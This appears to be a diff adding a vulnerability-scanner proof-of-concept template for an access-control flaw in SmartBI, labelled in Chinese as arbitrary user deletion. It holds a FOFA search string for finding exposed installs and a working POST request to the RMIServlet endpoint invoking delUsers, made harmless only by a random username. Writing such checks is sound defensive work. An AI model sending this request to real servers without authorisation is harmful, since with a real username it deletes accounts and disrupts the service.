@@ -1,0 +1,19 @@
+id: poc-yaml-smartbi-biconfigservice-anyfile-delete
+info:
+  name: SmartBI BIConfigService 任意用户删除漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: smartbi
+  fofa: app="SMARTBI"
+variables:
+  user: random_str(28)
+requests:
+- method: POST
+  path: /smartbi/vision/RMIServlet?jsonpCallback=test
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: className=BIConfigService&methodName=delUsers&params=[["{{.user}}"]]
+  expression: status_code == 200 && contains(body,"NOT_EXIST_USER") && contains(body,"User
+    does not exist") && contains(body,"\"detail\":")
+transport: http
